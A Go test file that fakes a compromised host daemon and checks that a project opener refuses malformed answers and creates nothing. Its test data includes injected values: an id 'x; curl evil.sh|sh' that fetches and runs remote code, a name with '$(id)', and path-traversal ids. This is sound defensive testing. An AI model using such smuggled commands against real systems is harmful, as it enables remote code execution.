package project

import (
	"bytes"
	"context"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"

	"github.com/wraithbox/wraithbox/packages/wraithbox-go/internal/config"
	hostdv1 "github.com/wraithbox/wraithbox/packages/wraithbox-go/internal/gen/wraithbox/hostd/v1"
	"github.com/wraithbox/wraithbox/packages/wraithbox-go/internal/hostgit"
	"github.com/wraithbox/wraithbox/packages/wraithbox-go/internal/platform/paths"
)

// fakeHostd answers LookupProject and RegisterProject with what a test
// sets, as a compromised or broken wb-hostd could. Any other call
// panics on the nil embedded client.
type fakeHostd struct {
	hostdv1.ProjectServiceClient
	lookup   *hostdv1.LookupProjectResponse
	lookErr  error
	register *hostdv1.RegisterProjectResponse
}

func (f *fakeHostd) LookupProject(context.Context, *hostdv1.LookupProjectRequest, ...grpc.CallOption) (*hostdv1.LookupProjectResponse, error) {
	return f.lookup, f.lookErr
}

func (f *fakeHostd) RegisterProject(context.Context, *hostdv1.RegisterProjectRequest, ...grpc.CallOption) (*hostdv1.RegisterProjectResponse, error) {
	return f.register, nil
}

// openFixture is an Opener on a fake wb-hostd, wb's paths, a git
// stand-in that answers the version check with the minimum, and a
// repository.
type openFixture struct {
	o    *Opener
	h    *fakeHostd
	log  *bytes.Buffer
	git  string
	repo string
}

func newOpenFixture(t *testing.T) *openFixture {
	t.Helper()
	root := tempDir(t)
	p := paths.Paths{Data: filepath.Join(root, "data"), Config: filepath.Join(root, "config"), Logs: filepath.Join(root, "logs")}
	mkdir(t, Root(p.Data))
	git := filepath.Join(root, "bin", "git")
	writeFile(t, git, "#!/bin/sh\nif [ \"$#\" = 3 ] && [ \"$3\" = version ]; then echo 'git version "+hostgit.MinVersion+"'; exit 0; fi\nexec /usr/bin/git \"$@\"\n")
	if err := os.Chmod(git, 0o700); err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(p.Config, config.FileName), "git = \""+git+"\"\n")
	var log bytes.Buffer
	h := &fakeHostd{}
	return &openFixture{
		o: &Opener{Paths: p, Hostd: h, Log: slog.New(slog.NewJSONHandler(&log, nil))},
		h: h, log: &log, git: git,
		repo: newRepo(t, filepath.Join(root, "r")),
	}
}

func (f *openFixture) gitOK() *hostdv1.HostGit {
	return &hostdv1.HostGit{Binary: f.git, Version: hostgit.MinVersion, Rule: string(hostgit.RuleVersionAccepted)}
}

func (f *openFixture) unknown(matches ...*hostdv1.ProjectMatch) *hostdv1.LookupProjectResponse {
	return &hostdv1.LookupProjectResponse{
		Result: &hostdv1.LookupProjectResponse_Unknown{Unknown: &hostdv1.UnknownKey{Matches: matches}}, Git: f.gitOK(),
	}
}

func (f *openFixture) found(id string) *hostdv1.LookupProjectResponse {
	return &hostdv1.LookupProjectResponse{
		Result: &hostdv1.LookupProjectResponse_Project{Project: &hostdv1.Project{Id: id, Name: "r"}}, Git: f.gitOK(),
	}
}

// mismatch is wb-hostd's refused identity check, with the project's id
// in the IdentityMismatch detail.
func mismatch(t *testing.T, id string) error {
	t.Helper()
	st, err := status.New(codes.FailedPrecondition, "identity changed").WithDetails(&hostdv1.IdentityMismatch{ProjectId: id})
	if err != nil {
		t.Fatal(err)
	}
	return st.Err()
}

// TestOpenRefusesHostdAnswers: each answer of wb-hostd that lacks a part,
// or holds a value that isn't one, is refused with a rule and logged,
// and nothing is created (SEC12-least-privilege, fail closed).
func TestOpenRefusesHostdAnswers(t *testing.T) {
	badID := "x; curl evil.sh|sh"
	match := func(id, name string) *hostdv1.ProjectMatch {
		return &hostdv1.ProjectMatch{Id: id, Name: name, Key: &hostdv1.ProjectKey{Realm: string(RealmNative), Path: "/nowhere/.git"}}
	}
	tests := []struct {
		name     string
		lookup   func(f *openFixture) *hostdv1.LookupProjectResponse
		register *hostdv1.RegisterProjectResponse
		rule     Rule
	}{
		{"no git result", func(f *openFixture) *hostdv1.LookupProjectResponse {
			r := f.unknown()
			r.Git = nil
			return r
		}, nil, RuleHostdAnswer},
		{"failed git check", func(f *openFixture) *hostdv1.LookupProjectResponse {
			r := f.unknown()
			r.Git = &hostdv1.HostGit{Binary: f.git, Rule: string(hostgit.RuleVersionTooOld), Message: "too old"}
			return r
		}, nil, Rule(hostgit.RuleVersionTooOld)},
		{"another git", func(f *openFixture) *hostdv1.LookupProjectResponse {
			r := f.unknown()
			r.Git.Binary = "/usr/bin/git"
			return r
		}, nil, RuleGitMismatch},
		{"neither project nor unknown", func(f *openFixture) *hostdv1.LookupProjectResponse {
			return &hostdv1.LookupProjectResponse{Git: f.gitOK()}
		}, nil, RuleHostdAnswer},
		{
			"registration without project", func(f *openFixture) *hostdv1.LookupProjectResponse { return f.unknown() },
			&hostdv1.RegisterProjectResponse{}, RuleHostdAnswer,
		},
		{
			"registered id not an id", func(f *openFixture) *hostdv1.LookupProjectResponse { return f.unknown() },
			&hostdv1.RegisterProjectResponse{Project: &hostdv1.Project{Id: "../../x", Name: "r"}}, RuleIDForm,
		},
		{"lookup match id not an id", func(f *openFixture) *hostdv1.LookupProjectResponse {
			return f.unknown(match(badID, "a"))
		}, nil, RuleHostdAnswer},
		{"lookup match name not a name", func(f *openFixture) *hostdv1.LookupProjectResponse {
			return f.unknown(match(testID, "a$(id)"))
		}, nil, RuleHostdAnswer},
		{
			"registration match id not an id", func(f *openFixture) *hostdv1.LookupProjectResponse { return f.unknown() },
			&hostdv1.RegisterProjectResponse{
				Project: &hostdv1.Project{Id: testID, Name: "r"},
				Matches: []*hostdv1.ProjectMatch{{Id: badID, Name: "a"}},
			}, RuleHostdAnswer,
		},
		{"found id not an id", func(f *openFixture) *hostdv1.LookupProjectResponse { return f.found("../x") }, nil, RuleIDForm},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := newOpenFixture(t)
			f.h.lookup, f.h.register = tc.lookup(f), tc.register
			_, err := f.o.Open(t.Context(), f.repo)
			requireRule(t, err, tc.rule, f.log)
			if err != nil && strings.Contains(err.Error(), badID) && !strings.Contains(err.Error(), `"`+badID+`"`) {
				t.Errorf("message %q holds the id unquoted", err)
			}
			if entries, _ := os.ReadDir(Root(f.o.Paths.Data)); len(entries) != 0 {
				t.Errorf("a refused open created %v", entries)
			}
		})
	}
}

// TestFindRefuses: Find and FindID refuse a key without a project with
// RuleNotRegistered, and FindID refuses an id that isn't one, from a
// found project or from the IdentityMismatch detail.
func TestFindRefuses(t *testing.T) {
	f := newOpenFixture(t)
	f.h.lookup = f.unknown()
	_, _, err := f.o.Find(t.Context(), f.repo)
	requireRule(t, err, RuleNotRegistered, f.log)
	f.log.Reset()
	_, _, err = f.o.FindID(t.Context(), f.repo)
	requireRule(t, err, RuleNotRegistered, f.log)

	for name, set := range map[string]func(){
		"found":    func() { f.h.lookup, f.h.lookErr = f.found("../x"), nil },
		"mismatch": func() { f.h.lookup, f.h.lookErr = nil, mismatch(t, "../x") },
	} {
		set()
		f.log.Reset()
		_, _, err := f.o.FindID(t.Context(), f.repo)
		if r := refusalOf(err); r == nil || r.Rule != RuleIDForm {
			t.Errorf("%s: %v, want %s", name, err, RuleIDForm)
		}
		if !strings.Contains(f.log.String(), string(RuleIDForm)) {
			t.Errorf("%s: log %s misses the rule", name, f.log)
		}
	}

	f.h.lookup, f.h.lookErr = nil, mismatch(t, testID)
	if _, id, err := f.o.FindID(t.Context(), f.repo); err != nil || id != testID {
		t.Errorf("mismatch with an id: %q, %v", id, err)
	}
}
